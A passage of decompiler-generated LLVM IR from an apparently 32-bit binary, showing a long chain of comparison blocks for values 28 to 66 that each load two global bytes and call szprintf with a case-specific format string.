  %v8_b10c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b4c0.138 to i32), i32 %v4_b10c, i32 %v6_b10c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b110

dec_label_pc_b110:                                ; preds = %dec_label_pc_b0dc, %dec_label_pc_b0e8
  %v7_b114 = icmp eq i32 %v2_ab54, 28
  br i1 %v7_b114, label %dec_label_pc_b11c, label %dec_label_pc_b144

dec_label_pc_b11c:                                ; preds = %dec_label_pc_b110
  %v3_b128 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b134 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b140 = sext i8 %v3_b128 to i32
  %v6_b140 = sext i8 %v3_b134 to i32
  %v8_b140 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b4d0.140 to i32), i32 %v4_b140, i32 %v6_b140, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b144

dec_label_pc_b144:                                ; preds = %dec_label_pc_b110, %dec_label_pc_b11c
  %v7_b148 = icmp eq i32 %v2_ab54, 29
  br i1 %v7_b148, label %dec_label_pc_b150, label %dec_label_pc_b178

dec_label_pc_b150:                                ; preds = %dec_label_pc_b144
  %v3_b15c = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b168 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b174 = sext i8 %v3_b15c to i32
  %v6_b174 = sext i8 %v3_b168 to i32
  %v8_b174 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b4e0.142 to i32), i32 %v4_b174, i32 %v6_b174, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b178

dec_label_pc_b178:                                ; preds = %dec_label_pc_b144, %dec_label_pc_b150
  %v7_b17c = icmp eq i32 %v2_ab54, 30
  br i1 %v7_b17c, label %dec_label_pc_b184, label %dec_label_pc_b1ac

dec_label_pc_b184:                                ; preds = %dec_label_pc_b178
  %v3_b190 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b19c = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b1a8 = sext i8 %v3_b190 to i32
  %v6_b1a8 = sext i8 %v3_b19c to i32
  %v8_b1a8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b4ec.144 to i32), i32 %v4_b1a8, i32 %v6_b1a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1ac

dec_label_pc_b1ac:                                ; preds = %dec_label_pc_b178, %dec_label_pc_b184
  %v7_b1b0 = icmp eq i32 %v2_ab54, 31
  br i1 %v7_b1b0, label %dec_label_pc_b1b8, label %dec_label_pc_b1e0

dec_label_pc_b1b8:                                ; preds = %dec_label_pc_b1ac
  %v3_b1c4 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b1d0 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b1dc = sext i8 %v3_b1c4 to i32
  %v6_b1dc = sext i8 %v3_b1d0 to i32
  %v8_b1dc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b4fc.146 to i32), i32 %v4_b1dc, i32 %v6_b1dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1e0

dec_label_pc_b1e0:                                ; preds = %dec_label_pc_b1ac, %dec_label_pc_b1b8
  %v7_b1e4 = icmp eq i32 %v2_ab54, 32
  br i1 %v7_b1e4, label %dec_label_pc_b1ec, label %dec_label_pc_b214

dec_label_pc_b1ec:                                ; preds = %dec_label_pc_b1e0
  %v3_b1f8 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b204 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b210 = sext i8 %v3_b1f8 to i32
  %v6_b210 = sext i8 %v3_b204 to i32
  %v8_b210 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1b508.148 to i32), i32 %v4_b210, i32 %v6_b210, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b214

dec_label_pc_b214:                                ; preds = %dec_label_pc_b1e0, %dec_label_pc_b1ec
  %v7_b218 = icmp eq i32 %v2_ab54, 33
  br i1 %v7_b218, label %dec_label_pc_b220, label %dec_label_pc_b248

dec_label_pc_b220:                                ; preds = %dec_label_pc_b214
  %v3_b22c = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b238 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b244 = sext i8 %v3_b22c to i32
  %v6_b244 = sext i8 %v3_b238 to i32
  %v8_b244 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b514.150 to i32), i32 %v4_b244, i32 %v6_b244, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b248

dec_label_pc_b248:                                ; preds = %dec_label_pc_b214, %dec_label_pc_b220
  %v7_b24c = icmp eq i32 %v2_ab54, 34
  br i1 %v7_b24c, label %dec_label_pc_b254, label %dec_label_pc_b27c

dec_label_pc_b254:                                ; preds = %dec_label_pc_b248
  %v3_b260 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b26c = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b278 = sext i8 %v3_b260 to i32
  %v6_b278 = sext i8 %v3_b26c to i32
  %v8_b278 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b520.152 to i32), i32 %v4_b278, i32 %v6_b278, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b27c

dec_label_pc_b27c:                                ; preds = %dec_label_pc_b248, %dec_label_pc_b254
  %v7_b280 = icmp eq i32 %v2_ab54, 35
  br i1 %v7_b280, label %dec_label_pc_b288, label %dec_label_pc_b2b0

dec_label_pc_b288:                                ; preds = %dec_label_pc_b27c
  %v3_b294 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b2a0 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b2ac = sext i8 %v3_b294 to i32
  %v6_b2ac = sext i8 %v3_b2a0 to i32
  %v8_b2ac = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b52c.154 to i32), i32 %v4_b2ac, i32 %v6_b2ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2b0

dec_label_pc_b2b0:                                ; preds = %dec_label_pc_b27c, %dec_label_pc_b288
  %v7_b2b4 = icmp eq i32 %v2_ab54, 36
  br i1 %v7_b2b4, label %dec_label_pc_b2bc, label %dec_label_pc_b2e4

dec_label_pc_b2bc:                                ; preds = %dec_label_pc_b2b0
  %v3_b2c8 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b2d4 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b2e0 = sext i8 %v3_b2c8 to i32
  %v6_b2e0 = sext i8 %v3_b2d4 to i32
  %v8_b2e0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b538.156 to i32), i32 %v4_b2e0, i32 %v6_b2e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2e4

dec_label_pc_b2e4:                                ; preds = %dec_label_pc_b2b0, %dec_label_pc_b2bc
  %v7_b2e8 = icmp eq i32 %v2_ab54, 37
  br i1 %v7_b2e8, label %dec_label_pc_b2f0, label %dec_label_pc_b318

dec_label_pc_b2f0:                                ; preds = %dec_label_pc_b2e4
  %v3_b2fc = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b308 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b314 = sext i8 %v3_b2fc to i32
  %v6_b314 = sext i8 %v3_b308 to i32
  %v8_b314 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b544.158 to i32), i32 %v4_b314, i32 %v6_b314, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b318

dec_label_pc_b318:                                ; preds = %dec_label_pc_b2e4, %dec_label_pc_b2f0
  %v7_b31c = icmp eq i32 %v2_ab54, 38
  br i1 %v7_b31c, label %dec_label_pc_b324, label %dec_label_pc_b34c

dec_label_pc_b324:                                ; preds = %dec_label_pc_b318
  %v3_b330 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b33c = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b348 = sext i8 %v3_b330 to i32
  %v6_b348 = sext i8 %v3_b33c to i32
  %v8_b348 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b550.160 to i32), i32 %v4_b348, i32 %v6_b348, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b34c

dec_label_pc_b34c:                                ; preds = %dec_label_pc_b318, %dec_label_pc_b324
  %v7_b350 = icmp eq i32 %v2_ab54, 39
  br i1 %v7_b350, label %dec_label_pc_b358, label %dec_label_pc_b380

dec_label_pc_b358:                                ; preds = %dec_label_pc_b34c
  %v3_b364 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b370 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b37c = sext i8 %v3_b364 to i32
  %v6_b37c = sext i8 %v3_b370 to i32
  %v8_b37c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b560.162 to i32), i32 %v4_b37c, i32 %v6_b37c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b380

dec_label_pc_b380:                                ; preds = %dec_label_pc_b34c, %dec_label_pc_b358
  %v7_b384 = icmp eq i32 %v2_ab54, 40
  br i1 %v7_b384, label %dec_label_pc_b38c, label %dec_label_pc_b3b4

dec_label_pc_b38c:                                ; preds = %dec_label_pc_b380
  %v3_b398 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b3a4 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b3b0 = sext i8 %v3_b398 to i32
  %v6_b3b0 = sext i8 %v3_b3a4 to i32
  %v8_b3b0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b550.160 to i32), i32 %v4_b3b0, i32 %v6_b3b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3b4

dec_label_pc_b3b4:                                ; preds = %dec_label_pc_b380, %dec_label_pc_b38c
  %v7_b3b8 = icmp eq i32 %v2_ab54, 41
  br i1 %v7_b3b8, label %dec_label_pc_b3c0, label %dec_label_pc_b3e8

dec_label_pc_b3c0:                                ; preds = %dec_label_pc_b3b4
  %v3_b3cc = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b3d8 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b3e4 = sext i8 %v3_b3cc to i32
  %v6_b3e4 = sext i8 %v3_b3d8 to i32
  %v8_b3e4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1b570.164 to i32), i32 %v4_b3e4, i32 %v6_b3e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3e8

dec_label_pc_b3e8:                                ; preds = %dec_label_pc_b3b4, %dec_label_pc_b3c0
  %v7_b3ec = icmp eq i32 %v2_ab54, 42
  br i1 %v7_b3ec, label %dec_label_pc_b3f4, label %dec_label_pc_b41c

dec_label_pc_b3f4:                                ; preds = %dec_label_pc_b3e8
  %v3_b400 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b40c = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b418 = sext i8 %v3_b400 to i32
  %v6_b418 = sext i8 %v3_b40c to i32
  %v8_b418 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b57c.166 to i32), i32 %v4_b418, i32 %v6_b418, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b41c

dec_label_pc_b41c:                                ; preds = %dec_label_pc_b3e8, %dec_label_pc_b3f4
  %v7_b420 = icmp eq i32 %v2_ab54, 43
  br i1 %v7_b420, label %dec_label_pc_b428, label %dec_label_pc_b450

dec_label_pc_b428:                                ; preds = %dec_label_pc_b41c
  %v3_b434 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b440 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b44c = sext i8 %v3_b434 to i32
  %v6_b44c = sext i8 %v3_b440 to i32
  %v8_b44c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b588.168 to i32), i32 %v4_b44c, i32 %v6_b44c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b450

dec_label_pc_b450:                                ; preds = %dec_label_pc_b41c, %dec_label_pc_b428
  %v7_b454 = icmp eq i32 %v2_ab54, 44
  br i1 %v7_b454, label %dec_label_pc_b45c, label %dec_label_pc_b484

dec_label_pc_b45c:                                ; preds = %dec_label_pc_b450
  %v3_b468 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b474 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b480 = sext i8 %v3_b468 to i32
  %v6_b480 = sext i8 %v3_b474 to i32
  %v8_b480 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b598.170 to i32), i32 %v4_b480, i32 %v6_b480, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b484

dec_label_pc_b484:                                ; preds = %dec_label_pc_b450, %dec_label_pc_b45c
  %v7_b488 = icmp eq i32 %v2_ab54, 45
  br i1 %v7_b488, label %dec_label_pc_b490, label %dec_label_pc_b4b8

dec_label_pc_b490:                                ; preds = %dec_label_pc_b484
  %v3_b49c = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b4a8 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b4b4 = sext i8 %v3_b49c to i32
  %v6_b4b4 = sext i8 %v3_b4a8 to i32
  %v8_b4b4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b5a4.172 to i32), i32 %v4_b4b4, i32 %v6_b4b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4b8

dec_label_pc_b4b8:                                ; preds = %dec_label_pc_b484, %dec_label_pc_b490
  %v7_b4bc = icmp eq i32 %v2_ab54, 46
  br i1 %v7_b4bc, label %dec_label_pc_b4c4, label %dec_label_pc_b4ec

dec_label_pc_b4c4:                                ; preds = %dec_label_pc_b4b8
  %v3_b4d0 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b4dc = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b4e8 = sext i8 %v3_b4d0 to i32
  %v6_b4e8 = sext i8 %v3_b4dc to i32
  %v8_b4e8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b5b4.174 to i32), i32 %v4_b4e8, i32 %v6_b4e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4ec

dec_label_pc_b4ec:                                ; preds = %dec_label_pc_b4b8, %dec_label_pc_b4c4
  %v7_b4f0 = icmp eq i32 %v2_ab54, 47
  br i1 %v7_b4f0, label %dec_label_pc_b4f8, label %dec_label_pc_b520

dec_label_pc_b4f8:                                ; preds = %dec_label_pc_b4ec
  %v3_b504 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b510 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b51c = sext i8 %v3_b504 to i32
  %v6_b51c = sext i8 %v3_b510 to i32
  %v8_b51c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b5c4.176 to i32), i32 %v4_b51c, i32 %v6_b51c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b520

dec_label_pc_b520:                                ; preds = %dec_label_pc_b4ec, %dec_label_pc_b4f8
  %v7_b524 = icmp eq i32 %v2_ab54, 48
  br i1 %v7_b524, label %dec_label_pc_b52c, label %dec_label_pc_b554

dec_label_pc_b52c:                                ; preds = %dec_label_pc_b520
  %v3_b538 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b544 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b550 = sext i8 %v3_b538 to i32
  %v6_b550 = sext i8 %v3_b544 to i32
  %v8_b550 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b5d4.178 to i32), i32 %v4_b550, i32 %v6_b550, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b554

dec_label_pc_b554:                                ; preds = %dec_label_pc_b520, %dec_label_pc_b52c
  %v7_b558 = icmp eq i32 %v2_ab54, 49
  br i1 %v7_b558, label %dec_label_pc_b560, label %dec_label_pc_b588

dec_label_pc_b560:                                ; preds = %dec_label_pc_b554
  %v3_b56c = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b578 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b584 = sext i8 %v3_b56c to i32
  %v6_b584 = sext i8 %v3_b578 to i32
  %v8_b584 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b5e0.180 to i32), i32 %v4_b584, i32 %v6_b584, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b588

dec_label_pc_b588:                                ; preds = %dec_label_pc_b554, %dec_label_pc_b560
  %v7_b58c = icmp eq i32 %v2_ab54, 50
  br i1 %v7_b58c, label %dec_label_pc_b594, label %dec_label_pc_b5bc

dec_label_pc_b594:                                ; preds = %dec_label_pc_b588
  %v3_b5a0 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b5ac = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b5b8 = sext i8 %v3_b5a0 to i32
  %v6_b5b8 = sext i8 %v3_b5ac to i32
  %v8_b5b8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1b5ec.182 to i32), i32 %v4_b5b8, i32 %v6_b5b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5bc

dec_label_pc_b5bc:                                ; preds = %dec_label_pc_b588, %dec_label_pc_b594
  %v7_b5c0 = icmp eq i32 %v2_ab54, 51
  br i1 %v7_b5c0, label %dec_label_pc_b5c8, label %dec_label_pc_b5f0

dec_label_pc_b5c8:                                ; preds = %dec_label_pc_b5bc
  %v3_b5d4 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b5e0 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b5ec = sext i8 %v3_b5d4 to i32
  %v6_b5ec = sext i8 %v3_b5e0 to i32
  %v8_b5ec = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b5f8.184 to i32), i32 %v4_b5ec, i32 %v6_b5ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5f0

dec_label_pc_b5f0:                                ; preds = %dec_label_pc_b5bc, %dec_label_pc_b5c8
  %v7_b5f4 = icmp eq i32 %v2_ab54, 52
  br i1 %v7_b5f4, label %dec_label_pc_b5fc, label %dec_label_pc_b624

dec_label_pc_b5fc:                                ; preds = %dec_label_pc_b5f0
  %v3_b608 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b614 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b620 = sext i8 %v3_b608 to i32
  %v6_b620 = sext i8 %v3_b614 to i32
  %v8_b620 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b608.186 to i32), i32 %v4_b620, i32 %v6_b620, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b624

dec_label_pc_b624:                                ; preds = %dec_label_pc_b5f0, %dec_label_pc_b5fc
  %v7_b628 = icmp eq i32 %v2_ab54, 53
  br i1 %v7_b628, label %dec_label_pc_b630, label %dec_label_pc_b658

dec_label_pc_b630:                                ; preds = %dec_label_pc_b624
  %v3_b63c = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b648 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b654 = sext i8 %v3_b63c to i32
  %v6_b654 = sext i8 %v3_b648 to i32
  %v8_b654 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1b618.188 to i32), i32 %v4_b654, i32 %v6_b654, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b658

dec_label_pc_b658:                                ; preds = %dec_label_pc_b624, %dec_label_pc_b630
  %v7_b65c = icmp eq i32 %v2_ab54, 54
  br i1 %v7_b65c, label %dec_label_pc_b664, label %dec_label_pc_b68c

dec_label_pc_b664:                                ; preds = %dec_label_pc_b658
  %v3_b670 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b67c = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b688 = sext i8 %v3_b670 to i32
  %v6_b688 = sext i8 %v3_b67c to i32
  %v8_b688 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b628.190 to i32), i32 %v4_b688, i32 %v6_b688, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b68c

dec_label_pc_b68c:                                ; preds = %dec_label_pc_b658, %dec_label_pc_b664
  %v7_b690 = icmp eq i32 %v2_ab54, 55
  br i1 %v7_b690, label %dec_label_pc_b698, label %dec_label_pc_b6c0

dec_label_pc_b698:                                ; preds = %dec_label_pc_b68c
  %v3_b6a4 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b6b0 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b6bc = sext i8 %v3_b6a4 to i32
  %v6_b6bc = sext i8 %v3_b6b0 to i32
  %v8_b6bc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1b638.192 to i32), i32 %v4_b6bc, i32 %v6_b6bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6c0

dec_label_pc_b6c0:                                ; preds = %dec_label_pc_b68c, %dec_label_pc_b698
  %v7_b6c4 = icmp eq i32 %v2_ab54, 56
  br i1 %v7_b6c4, label %dec_label_pc_b6cc, label %dec_label_pc_b6f4

dec_label_pc_b6cc:                                ; preds = %dec_label_pc_b6c0
  %v3_b6d8 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b6e4 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b6f0 = sext i8 %v3_b6d8 to i32
  %v6_b6f0 = sext i8 %v3_b6e4 to i32
  %v8_b6f0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1b648.194 to i32), i32 %v4_b6f0, i32 %v6_b6f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6f4

dec_label_pc_b6f4:                                ; preds = %dec_label_pc_b6c0, %dec_label_pc_b6cc
  %v7_b6f8 = icmp eq i32 %v2_ab54, 57
  br i1 %v7_b6f8, label %dec_label_pc_b700, label %dec_label_pc_b728

dec_label_pc_b700:                                ; preds = %dec_label_pc_b6f4
  %v3_b70c = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b718 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b724 = sext i8 %v3_b70c to i32
  %v6_b724 = sext i8 %v3_b718 to i32
  %v8_b724 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b658.196 to i32), i32 %v4_b724, i32 %v6_b724, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b728

dec_label_pc_b728:                                ; preds = %dec_label_pc_b6f4, %dec_label_pc_b700
  %v7_b72c = icmp eq i32 %v2_ab54, 58
  br i1 %v7_b72c, label %dec_label_pc_b734, label %dec_label_pc_b75c

dec_label_pc_b734:                                ; preds = %dec_label_pc_b728
  %v3_b740 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b74c = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b758 = sext i8 %v3_b740 to i32
  %v6_b758 = sext i8 %v3_b74c to i32
  %v8_b758 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b668.198 to i32), i32 %v4_b758, i32 %v6_b758, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b75c

dec_label_pc_b75c:                                ; preds = %dec_label_pc_b728, %dec_label_pc_b734
  %v7_b760 = icmp eq i32 %v2_ab54, 59
  br i1 %v7_b760, label %dec_label_pc_b768, label %dec_label_pc_b790

dec_label_pc_b768:                                ; preds = %dec_label_pc_b75c
  %v3_b774 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b780 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b78c = sext i8 %v3_b774 to i32
  %v6_b78c = sext i8 %v3_b780 to i32
  %v8_b78c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b678.200 to i32), i32 %v4_b78c, i32 %v6_b78c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b790

dec_label_pc_b790:                                ; preds = %dec_label_pc_b75c, %dec_label_pc_b768
  %v7_b794 = icmp eq i32 %v2_ab54, 60
  br i1 %v7_b794, label %dec_label_pc_b79c, label %dec_label_pc_b7c4

dec_label_pc_b79c:                                ; preds = %dec_label_pc_b790
  %v3_b7a8 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b7b4 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b7c0 = sext i8 %v3_b7a8 to i32
  %v6_b7c0 = sext i8 %v3_b7b4 to i32
  %v8_b7c0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b688.202 to i32), i32 %v4_b7c0, i32 %v6_b7c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b7c4

dec_label_pc_b7c4:                                ; preds = %dec_label_pc_b790, %dec_label_pc_b79c
  %v7_b7c8 = icmp eq i32 %v2_ab54, 61
  br i1 %v7_b7c8, label %dec_label_pc_b7d0, label %dec_label_pc_b7f8

dec_label_pc_b7d0:                                ; preds = %dec_label_pc_b7c4
  %v3_b7dc = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b7e8 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b7f4 = sext i8 %v3_b7dc to i32
  %v6_b7f4 = sext i8 %v3_b7e8 to i32
  %v8_b7f4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b698.204 to i32), i32 %v4_b7f4, i32 %v6_b7f4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b7f8

dec_label_pc_b7f8:                                ; preds = %dec_label_pc_b7c4, %dec_label_pc_b7d0
  %v7_b7fc = icmp eq i32 %v2_ab54, 62
  br i1 %v7_b7fc, label %dec_label_pc_b804, label %dec_label_pc_b82c

dec_label_pc_b804:                                ; preds = %dec_label_pc_b7f8
  %v3_b810 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b81c = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b828 = sext i8 %v3_b810 to i32
  %v6_b828 = sext i8 %v3_b81c to i32
  %v8_b828 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b6a8.206 to i32), i32 %v4_b828, i32 %v6_b828, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b82c

dec_label_pc_b82c:                                ; preds = %dec_label_pc_b7f8, %dec_label_pc_b804
  %v7_b830 = icmp eq i32 %v2_ab54, 63
  br i1 %v7_b830, label %dec_label_pc_b838, label %dec_label_pc_b860

dec_label_pc_b838:                                ; preds = %dec_label_pc_b82c
  %v3_b844 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b850 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b85c = sext i8 %v3_b844 to i32
  %v6_b85c = sext i8 %v3_b850 to i32
  %v8_b85c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b6b8.208 to i32), i32 %v4_b85c, i32 %v6_b85c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b860

dec_label_pc_b860:                                ; preds = %dec_label_pc_b82c, %dec_label_pc_b838
  %v7_b864 = icmp eq i32 %v2_ab54, 64
  br i1 %v7_b864, label %dec_label_pc_b86c, label %dec_label_pc_b894

dec_label_pc_b86c:                                ; preds = %dec_label_pc_b860
  %v3_b878 = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b884 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b890 = sext i8 %v3_b878 to i32
  %v6_b890 = sext i8 %v3_b884 to i32
  %v8_b890 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b6c8.210 to i32), i32 %v4_b890, i32 %v6_b890, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b894

dec_label_pc_b894:                                ; preds = %dec_label_pc_b860, %dec_label_pc_b86c
  %v7_b898 = icmp eq i32 %v2_ab54, 65
  br i1 %v7_b898, label %dec_label_pc_b8a0, label %dec_label_pc_b8c8

dec_label_pc_b8a0:                                ; preds = %dec_label_pc_b894
  %v3_b8ac = load i8, i8* @global_var_2d61d.83, align 1
  %v3_b8b8 = load i8, i8* @global_var_2d61e.84, align 1
  %v4_b8c4 = sext i8 %v3_b8ac to i32
  %v6_b8c4 = sext i8 %v3_b8b8 to i32
  %v8_b8c4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b6d8.212 to i32), i32 %v4_b8c4, i32 %v6_b8c4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b8c8

dec_label_pc_b8c8:                                ; preds = %dec_label_pc_b894, %dec_label_pc_b8a0
  %v7_b8cc = icmp eq i32 %v2_ab54, 66
  br i1 %v7_b8cc, label %dec_label_pc_b8d4, label %dec_label_pc_b8fc

dec_label_pc_b8d4:                                ; preds = %dec_label_pc_b8c8
